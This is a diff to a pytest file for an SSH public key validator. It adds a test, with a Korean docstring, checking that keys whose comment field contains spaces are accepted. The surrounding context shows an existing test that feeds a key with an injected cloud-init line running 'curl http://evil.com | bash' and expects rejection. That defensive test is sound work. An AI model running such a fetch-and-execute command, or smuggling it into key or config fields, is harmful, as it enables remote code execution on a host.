@@ -180,3 +180,8 @@ class TestSshPublicKeyValidation:
         key = "ssh-ed25519 AAAA\nruncmd:\n  - curl http://evil.com | bash"
         with pytest.raises(ValueError):
             _validate_ssh_public_key(key)
+
+    def test_multi_word_comment_accepted(self):
+        """코멘트 필드에 공백이 포함된 키도 통과해야 한다 (예: 'termius by jung')."""
+        key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest termius by jung"
+        _validate_ssh_public_key(key)  # 예외 없어야 함
